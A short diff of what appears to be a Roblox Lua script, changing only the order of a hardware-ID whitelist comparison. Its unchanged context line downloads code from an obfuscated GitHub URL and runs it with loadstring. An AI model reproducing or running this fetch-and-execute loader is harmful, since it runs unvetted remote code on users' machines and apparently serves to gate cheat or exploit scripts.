@@ -19,7 +19,7 @@ function loadscript()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Fr0go1/akdhfdsiujhkjbsda/main/fdssdfadsafdsffdsahgfgsdasfdzvabfdhgfnddhfsgdaasfsdafbfsdhdfgdfgsdadsafdsgagdfsdfsdgsfbsxfvfxssd"))()
 end
 
-if hwid == whitelisthwid then
+if whitelisthwid == hwid then
     loadscript()
 end
 
